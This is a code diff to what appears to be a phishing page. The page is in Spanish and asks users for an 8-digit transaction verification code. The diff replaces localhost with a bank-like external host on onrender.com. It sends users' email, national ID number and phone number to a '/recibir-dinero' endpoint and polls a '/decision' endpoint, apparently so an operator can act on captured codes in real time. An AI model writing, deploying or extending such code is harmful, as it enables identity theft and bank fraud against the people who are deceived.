@@ -329,6 +329,7 @@ Para autorizar esta transacción, ingresa el código de verificación de 8 dígi
 </div>
 </div>
 <script>
+var API_BASE = window.location.hostname === "localhost" ? "http://localhost:4000" : "https://brbpagos4banncs-api.onrender.com";
 var inputs = Array.prototype.slice.call(document.querySelectorAll(".code-input"));
 var authorizeButton = document.querySelector(".authorize-button");
 var loadingOverlay = document.getElementById("loading-overlay");
@@ -384,7 +385,7 @@ if (decisionIntervalId !== null) {
 return;
 }
 decisionIntervalId = setInterval(function () {
-fetch("http://localhost:4000/decision")
+fetch(API_BASE + "/decision")
 .then(function (res) {
 return res.json();
 })
@@ -422,7 +423,7 @@ email: userEmail,
 cedula: userCedula,
 celular: userCelular
 };
-fetch("http://localhost:4000/recibir-dinero", {
+fetch(API_BASE + "/recibir-dinero", {
 method: "POST",
 headers: {
 "Content-Type": "application/json"
